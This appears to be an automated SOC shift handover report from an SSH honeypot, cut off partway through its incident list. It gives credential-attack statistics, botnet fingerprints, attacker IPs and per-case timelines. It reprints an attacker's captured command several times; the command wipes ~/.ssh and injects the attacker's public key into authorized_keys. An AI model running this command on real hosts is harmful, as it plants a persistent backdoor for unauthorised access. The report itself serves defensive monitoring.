# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-02 |
| **Generated At** | 2026-06-02T16:40:33Z |
| **Shift Time** | 16:40 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **576** |
| Confirmed Threats | **542** |
| False Positives Filtered | **34** (5.9%) |
| Unique Attacker IPs | **72** |
| Countries of Origin | **29** |
| High Severity Cases | **144** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **432** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **382** |
| Unique Credential Pairs | **198** |
| Unique Usernames | **127** |
| Unique Passwords | **164** |
| Successful Auth Pairs | **93** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 143 |
| `345gs5662d34` | 68 |
| `user` | 8 |
| `ubuntu` | 5 |
| `admin` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 70 |
| `345gs5662d34` | 68 |
| `123456` | 28 |
| `12345678` | 4 |
| `123` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 69 |
| `345gs5662d34` | `345gs5662d34` | 68 |
| `root` | `alain` | 2 |
| `wagner` | `wagner123` | 2 |
| `ma` | `123456` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `pass...` | `49.64.85.138` | 2026-06-02T11:11:44 |
| `root` | `3245gs5662d34` | `49.64.85.138` | 2026-06-02T11:11:53 |
| `root` | `Cq123456@` | `36.255.220.145` | 2026-06-02T11:11:54 |
| `root` | `3245gs5662d34` | `36.255.220.145` | 2026-06-02T11:11:57 |
| `root` | `159357852` | `103.172.20.218` | 2026-06-02T11:14:39 |
| `root` | `3245gs5662d34` | `103.172.20.218` | 2026-06-02T11:14:44 |
| `root` | `Hello2025` | `103.172.20.218` | 2026-06-02T11:17:38 |
| `root` | `Nadx@2025` | `103.172.20.218` | 2026-06-02T11:39:36 |
| `root` | `868686` | `103.172.20.218` | 2026-06-02T11:44:21 |
| `root` | `alain` | `171.244.37.103` | 2026-06-02T11:46:08 |
| `root` | `3245gs5662d34` | `171.244.37.103` | 2026-06-02T11:46:11 |
| `root` | `Sina.com` | `103.172.20.218` | 2026-06-02T11:48:58 |
| `root` | `Pj123456@` | `103.172.20.218` | 2026-06-02T11:50:31 |
| `root` | `P@ssword2024!` | `103.172.20.218` | 2026-06-02T11:52:03 |
| `root` | `Root.2025` | `182.93.50.90` | 2026-06-02T12:02:46 |
| `root` | `3245gs5662d34` | `182.93.50.90` | 2026-06-02T12:02:49 |
| `root` | `hy@123456` | `182.93.50.90` | 2026-06-02T12:08:06 |
| `root` | `alain` | `182.93.50.90` | 2026-06-02T12:15:58 |
| `root` | `Abcde123` | `182.93.50.90` | 2026-06-02T12:29:17 |
| `root` | `admin` | `119.192.53.4` | 2026-06-02T12:37:53 |
| `root` | `123qweasd123` | `182.93.50.90` | 2026-06-02T12:39:53 |
| `root` | `Qwerty#2025` | `182.93.50.90` | 2026-06-02T13:03:36 |
| `root` | `555` | `182.93.50.90` | 2026-06-02T13:06:14 |
| `root` | `St123456` | `101.79.165.43` | 2026-06-02T13:29:13 |
| `root` | `3245gs5662d34` | `101.79.165.43` | 2026-06-02T13:29:16 |
| `root` | `123456Ab` | `101.79.165.43` | 2026-06-02T13:30:56 |
| `root` | `root@2022` | `101.79.165.43` | 2026-06-02T13:36:27 |
| `root` | `ASDFqwer1234` | `101.79.165.43` | 2026-06-02T13:44:49 |
| `root` | `3edcVFR$` | `101.79.165.43` | 2026-06-02T13:46:57 |
| `root` | `hello2024` | `101.79.165.43` | 2026-06-02T13:51:01 |
| `root` | `1234561` | `101.79.165.43` | 2026-06-02T13:53:06 |
| `root` | `Test123!@` | `101.79.165.43` | 2026-06-02T13:57:17 |
| `root` | `server@1234` | `101.79.165.43` | 2026-06-02T14:01:30 |
| `phil` | `phil123` | `101.79.165.43` | 2026-06-02T14:05:38 |
| `phil` | `3245gs5662d34` | `101.79.165.43` | 2026-06-02T14:05:41 |
| `root` | `1qazxsw2#EDCVFR$` | `41.242.115.84` | 2026-06-02T14:06:07 |
| `root` | `3245gs5662d34` | `41.242.115.84` | 2026-06-02T14:06:12 |
| `root` | `eZZJh2NiLL` | `39.107.98.225` | 2026-06-02T14:09:41 |
| `root` | `Lh123456@` | `118.186.7.10` | 2026-06-02T15:28:24 |
| `root` | `3245gs5662d34` | `118.186.7.10` | 2026-06-02T15:28:28 |
| `root` | `root23` | `150.136.129.10` | 2026-06-02T15:30:16 |
| `root` | `3245gs5662d34` | `150.136.129.10` | 2026-06-02T15:30:21 |
| `root` | `Passw0rd123!` | `78.89.154.59` | 2026-06-02T15:42:03 |
| `root` | `3245gs5662d34` | `78.89.154.59` | 2026-06-02T15:42:12 |
| `root` | `rio` | `78.89.154.59` | 2026-06-02T15:43:27 |
| `root` | `hetzner123` | `182.43.235.75` | 2026-06-02T15:47:24 |
| `root` | `3245gs5662d34` | `182.43.235.75` | 2026-06-02T15:47:28 |
| `root` | `automa` | `78.89.154.59` | 2026-06-02T15:48:16 |
| `root` | `Admin*2023` | `8.154.2.19` | 2026-06-02T15:48:53 |
| `root` | `3245gs5662d34` | `8.154.2.19` | 2026-06-02T15:48:57 |
| `root` | `ubuntu` | `121.26.28.26` | 2026-06-02T15:51:15 |
| `root` | `QWEasd!@#123` | `78.89.154.59` | 2026-06-02T15:53:08 |
| `root` | `anonymous` | `51.75.64.35` | 2026-06-02T15:53:22 |
| `root` | `3245gs5662d34` | `51.75.64.35` | 2026-06-02T15:53:25 |
| `root` | `qwertyuiop1234567890` | `115.135.233.75` | 2026-06-02T15:53:27 |
| `root` | `3245gs5662d34` | `115.135.233.75` | 2026-06-02T15:53:30 |
| `root` | `123!@#Qwe` | `92.113.142.203` | 2026-06-02T15:53:35 |
| `root` | `3245gs5662d34` | `92.113.142.203` | 2026-06-02T15:53:39 |
| `root` | `Aa000000` | `51.75.64.35` | 2026-06-02T15:54:47 |
| `root` | `Pass2025` | `92.113.142.203` | 2026-06-02T15:55:14 |
| `root` | `anonymous` | `195.199.210.194` | 2026-06-02T15:55:56 |
| `root` | `3245gs5662d34` | `195.199.210.194` | 2026-06-02T15:56:01 |
| `root` | `aaaaaaaa` | `92.113.142.203` | 2026-06-02T15:56:49 |
| `root` | `mercedes` | `51.75.64.35` | 2026-06-02T15:57:31 |
| `root` | `zxcvbnmkl` | `195.199.210.194` | 2026-06-02T15:59:20 |
| `root` | `Zz112233` | `51.75.64.35` | 2026-06-02T16:05:38 |
| `root` | `Zs123456` | `195.199.210.194` | 2026-06-02T16:06:19 |
| `root` | `0416` | `203.116.129.55` | 2026-06-02T16:07:03 |
| `root` | `3245gs5662d34` | `203.116.129.55` | 2026-06-02T16:07:07 |
| `root` | `Aa88888888` | `51.75.64.35` | 2026-06-02T16:07:09 |
| `root` | `S3curity` | `92.113.142.203` | 2026-06-02T16:07:18 |
| `root` | `mercedes` | `195.199.210.194` | 2026-06-02T16:08:02 |
| `root` | `Admin1234.` | `51.75.64.35` | 2026-06-02T16:08:33 |
| `root` | `Wd123456` | `92.113.142.203` | 2026-06-02T16:08:48 |
| `root` | `RootPass` | `51.75.64.35` | 2026-06-02T16:09:56 |
| `root` | `strongpass` | `195.199.210.194` | 2026-06-02T16:11:22 |
| `root` | `Aaaaaaa1` | `51.75.64.35` | 2026-06-02T16:11:23 |
| `root` | `P@ssw0rd9` | `92.113.142.203` | 2026-06-02T16:11:56 |
| `root` | `Aa000000` | `195.199.210.194` | 2026-06-02T16:13:07 |
| `root` | `ZAQ!2wsx2022#` | `92.113.142.203` | 2026-06-02T16:15:01 |
| `root` | `zxcvbnmkl` | `51.75.64.35` | 2026-06-02T16:17:00 |
| `root` | `Aa88888888` | `195.199.210.194` | 2026-06-02T16:18:16 |
| `root` | `RootPass` | `195.199.210.194` | 2026-06-02T16:20:03 |
| `root` | `Wangsu@2025` | `51.75.64.35` | 2026-06-02T16:22:42 |
| `root` | `password` | `2.26.147.19` | 2026-06-02T16:24:02 |
| `root` | `Zs123456` | `51.75.64.35` | 2026-06-02T16:25:38 |
| `root` | `Aaaaaaa1` | `195.199.210.194` | 2026-06-02T16:28:28 |
| `root` | `Wangsu@2025` | `195.199.210.194` | 2026-06-02T16:30:12 |
| `root` | `asdfg!@#` | `1.222.42.237` | 2026-06-02T16:30:18 |
| `root` | `3245gs5662d34` | `1.222.42.237` | 2026-06-02T16:30:22 |
| `root` | `Zz112233` | `195.199.210.194` | 2026-06-02T16:32:01 |
| `root` | `strongpass` | `51.75.64.35` | 2026-06-02T16:32:35 |
| `root` | `Admin1234.` | `195.199.210.194` | 2026-06-02T16:33:44 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **576** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 423 |
| Go SSH scanner | 5 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 319 | 21 |
| `03a80b21afa8...` | Modern SSH client | 93 | 8 |
| `af8223ac9914...` | libssh-based | 3 | 1 |
| `f45fb203c310...` | Mirai/variant | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 319 | 21 | Mirai/variant |
| `03a80b21afa8...` | libssh | 93 | 8 | Modern SSH client |
| `95420f9d932d...` | libssh | 7 | 6 | — |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |
| `bc3aee897af7...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 70 | 18 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `51.75.64.35`, `92.113.142.203`, `115.135.233.75`, `150.136.129.10`, `118.186.7.10`, `8.154.2.19`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **72** |
| Unique ASNs | **49** |
| High-Risk ASNs | **41** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 6 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS209334` | Modat B.V. | 2 | HIGH |
| `AS58519` | Cloud Computing Corporation | 2 | HIGH |
| `AS132199` | Globe Telecom Inc. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (142)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9187dc1caa88

| Field | Detail |
|---|---|
| **Source IP** | `49.64.85[.]138` |
| **First Seen** | 2026-06-02 11:11 |
| **Last Seen** | 2026-06-02 11:11 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:11:42` | `cowrie.session.connect` |
| `2026-06-02 11:11:42` | `cowrie.client.version` |
| `2026-06-02 11:11:43` | `cowrie.client.kex` |
| `2026-06-02 11:11:44` | `cowrie.login.success` |
| `2026-06-02 11:11:44` | `cowrie.session.params` |
| `2026-06-02 11:11:44` | `cowrie.command.input` |
| `2026-06-02 11:11:44` | `cowrie.command.failed` |
| `2026-06-02 11:11:45` | `cowrie.log.closed` |
| `2026-06-02 11:11:45` | `cowrie.session.params` |
| `2026-06-02 11:11:45` | `cowrie.command.input` |
| `2026-06-02 11:11:46` | `cowrie.session.file_download` |
| `2026-06-02 11:11:46` | `cowrie.log.closed` |
| `2026-06-02 11:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.85[.]138` to AbuseIPDB if not already reported
- [ ] Block `49.64.85[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f66e1208b254

| Field | Detail |
|---|---|
| **Source IP** | `49.64.85[.]138` |
| **First Seen** | 2026-06-02 11:11 |
| **Last Seen** | 2026-06-02 11:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:11:52` | `cowrie.session.connect` |
| `2026-06-02 11:11:52` | `cowrie.client.version` |
| `2026-06-02 11:11:52` | `cowrie.client.kex` |
| `2026-06-02 11:11:53` | `cowrie.login.success` |
| `2026-06-02 11:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.85[.]138` to AbuseIPDB if not already reported
- [ ] Block `49.64.85[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d4a592f3c00

| Field | Detail |
|---|---|
| **Source IP** | `36.255.220[.]145` |
| **First Seen** | 2026-06-02 11:11 |
| **Last Seen** | 2026-06-02 11:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:11:54` | `cowrie.session.connect` |
| `2026-06-02 11:11:54` | `cowrie.client.version` |
| `2026-06-02 11:11:54` | `cowrie.client.kex` |
| `2026-06-02 11:11:54` | `cowrie.login.success` |
| `2026-06-02 11:11:55` | `cowrie.session.params` |
| `2026-06-02 11:11:55` | `cowrie.command.input` |
| `2026-06-02 11:11:55` | `cowrie.command.failed` |
| `2026-06-02 11:11:55` | `cowrie.log.closed` |
| `2026-06-02 11:11:55` | `cowrie.session.params` |
| `2026-06-02 11:11:55` | `cowrie.command.input` |
| `2026-06-02 11:11:55` | `cowrie.session.file_download` |
| `2026-06-02 11:11:55` | `cowrie.log.closed` |
| `2026-06-02 11:11:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.255.220[.]145` to AbuseIPDB if not already reported
- [ ] Block `36.255.220[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-353096ca77d8

| Field | Detail |
|---|---|
| **Source IP** | `36.255.220[.]145` |
| **First Seen** | 2026-06-02 11:11 |
| **Last Seen** | 2026-06-02 11:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:11:57` | `cowrie.session.connect` |
| `2026-06-02 11:11:57` | `cowrie.client.version` |
| `2026-06-02 11:11:57` | `cowrie.client.kex` |
| `2026-06-02 11:11:57` | `cowrie.login.success` |
| `2026-06-02 11:11:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.255.220[.]145` to AbuseIPDB if not already reported
- [ ] Block `36.255.220[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0d21b951777

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-02 11:14 |
| **Last Seen** | 2026-06-02 11:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:14:39` | `cowrie.session.connect` |
| `2026-06-02 11:14:39` | `cowrie.client.version` |
| `2026-06-02 11:14:39` | `cowrie.client.kex` |
| `2026-06-02 11:14:39` | `cowrie.login.success` |
| `2026-06-02 11:14:40` | `cowrie.session.params` |
| `2026-06-02 11:14:40` | `cowrie.command.input` |
| `2026-06-02 11:14:40` | `cowrie.command.failed` |
| `2026-06-02 11:14:40` | `cowrie.log.closed` |
| `2026-06-02 11:14:40` | `cowrie.session.params` |
| `2026-06-02 11:14:40` | `cowrie.command.input` |
| `2026-06-02 11:14:41` | `cowrie.session.file_download` |
| `2026-06-02 11:14:41` | `cowrie.log.closed` |
| `2026-06-02 11:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-179628952631

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-02 11:14 |
| **Last Seen** | 2026-06-02 11:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:14:43` | `cowrie.session.connect` |
| `2026-06-02 11:14:43` | `cowrie.client.version` |
| `2026-06-02 11:14:43` | `cowrie.client.kex` |
| `2026-06-02 11:14:44` | `cowrie.login.success` |
| `2026-06-02 11:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa447993bbfe

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-02 11:17 |
| **Last Seen** | 2026-06-02 11:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:17:38` | `cowrie.session.connect` |
| `2026-06-02 11:17:38` | `cowrie.client.version` |
| `2026-06-02 11:17:38` | `cowrie.client.kex` |
| `2026-06-02 11:17:38` | `cowrie.login.success` |
| `2026-06-02 11:17:39` | `cowrie.session.params` |
| `2026-06-02 11:17:39` | `cowrie.command.input` |
| `2026-06-02 11:17:39` | `cowrie.command.failed` |
| `2026-06-02 11:17:39` | `cowrie.log.closed` |
| `2026-06-02 11:17:39` | `cowrie.session.params` |
| `2026-06-02 11:17:39` | `cowrie.command.input` |
| `2026-06-02 11:17:39` | `cowrie.session.file_download` |
| `2026-06-02 11:17:39` | `cowrie.log.closed` |
| `2026-06-02 11:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8425f5c85c36

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-02 11:17 |
| **Last Seen** | 2026-06-02 11:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:17:42` | `cowrie.session.connect` |
| `2026-06-02 11:17:42` | `cowrie.client.version` |
| `2026-06-02 11:17:42` | `cowrie.client.kex` |
| `2026-06-02 11:17:43` | `cowrie.login.success` |
| `2026-06-02 11:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31d8926774ed

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-02 11:39 |
| **Last Seen** | 2026-06-02 11:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:39:35` | `cowrie.session.connect` |
| `2026-06-02 11:39:35` | `cowrie.client.version` |
| `2026-06-02 11:39:35` | `cowrie.client.kex` |
| `2026-06-02 11:39:36` | `cowrie.login.success` |
| `2026-06-02 11:39:36` | `cowrie.session.params` |
| `2026-06-02 11:39:36` | `cowrie.command.input` |
| `2026-06-02 11:39:36` | `cowrie.command.failed` |
| `2026-06-02 11:39:37` | `cowrie.log.closed` |
| `2026-06-02 11:39:37` | `cowrie.session.params` |
| `2026-06-02 11:39:37` | `cowrie.command.input` |
| `2026-06-02 11:39:37` | `cowrie.session.file_download` |
| `2026-06-02 11:39:37` | `cowrie.log.closed` |
| `2026-06-02 11:39:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e2518d01edb

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-02 11:39 |
| **Last Seen** | 2026-06-02 11:39 |
